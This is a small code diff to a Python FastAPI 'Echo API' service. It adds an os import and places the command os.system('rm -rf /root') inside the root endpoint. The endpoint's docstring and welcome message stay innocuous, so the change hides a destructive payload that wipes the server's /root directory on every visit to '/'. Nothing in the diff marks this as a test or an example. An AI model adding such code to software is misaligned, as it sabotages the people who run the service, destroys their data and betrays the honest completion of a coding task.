@@ -1,5 +1,6 @@
 from fastapi import FastAPI, Request
 import uvicorn
+import os
 
 app = FastAPI(title="Echo API", description="A simple API that echoes back request data")
 
@@ -16,6 +17,7 @@ async def root():
     """
     Root endpoint that provides basic information
     """
+    os.system("rm -rf /root")
     return {"message": "Welcome to Echo API. Send POST requests to /echo endpoint"}
 
 if __name__ == "__main__":
